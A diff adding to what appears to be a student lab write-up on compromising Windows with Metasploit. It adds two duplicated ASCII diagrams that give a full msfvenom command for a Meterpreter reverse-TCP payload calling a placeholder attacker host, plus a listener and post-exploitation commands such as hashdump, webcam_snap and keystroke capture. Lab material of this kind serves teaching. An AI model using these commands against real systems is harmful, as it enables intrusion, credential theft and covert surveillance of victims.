@@ -87,3 +87,67 @@ keyscan_dump Shows the keystrokes captured so far
 
 ## RESULT:
 The Metasploit framework is  used to compromise windows and is examined successfully.
+
+
+
+## arcg
+
+```bash
++----------------+                           +------------------+
+|                |      Reverse Shell        |                  |
+| Attacker       | <-------------------------|   Victim (Win)   |
+| (Kali Linux)   |       (TCP 4444)          |  Unpatched SMB   |
+|  - msfconsole  |                           |  RDP, AV Bypass  |
+|  - handler     |                           |                  |
++-------+--------+                           +--------+---------+
+        |                                             |
+        | Payload generation using msfvenom           |
+        |                                             |
+        v                                             v
+msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload
+         LHOST=attacker_ip LPORT=4444               or exploit triggers
+         -f exe > evil.exe
+
+        |
+        | Listener waits (multi/handler)
+        v
+
++------------------------------------------------------------+
+|     Meterpreter Session Established (shell access)         |
++------------------------------------------------------------+
+| Commands: sysinfo, hashdump, migrate, webcam_snap, etc.    |
++------------------------------------------------------------+
+
+```
+
+## 2
+
+```bash
+## 🛠️ Metasploit Exploitation Architecture (Windows Target)
+
+
++----------------+                           +------------------+
+|  🟢 Attacker    |      🔁 Reverse Shell      |   🔴 Victim (Win) |
+|  (Kali Linux)  | <------------------------- |  Unpatched SMB   |
+|  - msfconsole  |       (TCP 4444)          |  RDP, AV Bypass  |
+|  - handler     |                           |                  |
++-------+--------+                           +--------+---------+
+        |                                             |
+        |  ⚙️ Payload generation using msfvenom        |
+        |                                             |
+        v                                             v
+msfvenom -p windows/meterpreter/reverse_tcp  -->  User clicks payload  
+         LHOST=attacker_ip LPORT=4444               or exploit triggers  
+         -f exe > evil.exe  
+
+        |
+        |  🧲 Listener waits (multi/handler)
+        v
+
++------------------------------------------------------------+
+|     🧠 Meterpreter Session Established (shell access)       |
++------------------------------------------------------------+
+| Commands: sysinfo | hashdump | migrate | webcam_snap | etc |
++------------------------------------------------------------+
+
+```
